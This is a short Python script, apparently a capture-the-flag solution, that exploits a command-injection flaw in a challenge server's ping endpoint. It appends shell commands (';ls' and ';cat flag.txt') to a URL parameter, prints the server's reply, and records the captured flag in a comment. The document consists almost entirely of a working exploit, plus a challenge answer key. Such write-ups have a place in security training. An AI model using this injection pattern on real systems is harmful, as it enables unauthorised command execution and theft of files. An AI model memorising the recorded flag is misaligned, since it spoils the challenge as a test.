import requests as req
import base64

url = "https://challenges.isictf.live:1414//ping?url="
command1="https://github.com/;ls"
command2="https://github.com/;cat flag.txt"
resp = req.get(url+command2)
print(resp.text)

#flag : ISICTF{w47ch_0u7_f0r_7h3_c0mm4nd_1nj3c710n}
